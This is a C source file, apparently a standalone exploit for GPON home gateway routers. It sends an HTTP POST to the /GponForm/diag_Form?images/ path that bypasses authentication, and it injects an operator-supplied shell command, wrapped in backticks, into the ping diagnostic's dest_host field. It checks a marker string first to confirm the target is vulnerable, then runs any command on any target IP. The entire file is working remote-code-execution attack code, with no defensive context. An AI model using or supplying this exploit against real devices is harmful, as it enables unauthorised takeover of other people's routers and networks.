// "GPON Home Gateway

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <regex.h>
#include <time.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 8080

// Function to create an HTTP POST request
void create_http_post_request(const char *target_ip, const char *data, char *request, size_t request_size) {
    snprintf(request, request_size,
             "POST /GponForm/diag_Form?images/ HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Connection: close\r\n"
             "Content-Length: %zu\r\n\r\n"
             "%s",
             target_ip, strlen(data), data);
}

// Function to send an HTTP POST request and receive the response
int send_http_post_request(const char *target_ip, const char *data, char *response, size_t response_size) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    int bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Create and send the HTTP POST request
    create_http_post_request(target_ip, data, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    // Receive the response
    memset(response, 0, response_size);
    bytes_received = recv(sock, response, response_size - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to create an HTTP GET request
void create_http_get_request(const char *target_ip, char *request, size_t request_size) {
    snprintf(request, request_size,
             "GET /diag.html?images/ HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             target_ip);
}

// Function to send an HTTP GET request and receive the response
int send_http_get_request(const char *target_ip, char *response, size_t response_size) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    int bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Create and send the HTTP GET request
    create_http_get_request(target_ip, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    // Receive the response
    memset(response, 0, response_size);
    bytes_received = recv(sock, response, response_size - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to execute a command on the target
char *execute_command(const char *target_ip, const char *cmd) {
    static char response[MAX_RESPONSE_SIZE];
    char payload[256];
    
    // Prepare the payload
    snprintf(payload, sizeof(payload), "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`%s`;%s&ipv=0", cmd, cmd);

    // Send the POST request
    if (send_http_post_request(target_ip, payload, response, sizeof (response)) < 0) {
        fprintf(stderr, "Command execution failed\n");
        return NULL;
    }

    // Attempt to retrieve the response
    return response;
}

// Function to check if the target is vulnerable
int check_vulnerability(const char *target_ip) {
    char response[MAX_RESPONSE_SIZE];
    char mark[13];
    snprintf(mark, sizeof(mark), "%s", "testmark123"); // Random text for vulnerability check

    // Execute a command to check vulnerability
    char *result = execute_command(target_ip, mark);
    if (result && strstr(result, mark) != NULL) {
        return 1; // Target is vulnerable
    }

    return 0; // Target is not vulnerable
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *cmd = argv[2]; // Command to execute from command line argument

    if (check_vulnerability(target_ip)) {
        char *response = execute_command(target_ip, cmd); // Execute the command
        if (response) {
            printf("Response: %s\n", response);
        }
    }

    return EXIT_SUCCESS;
}
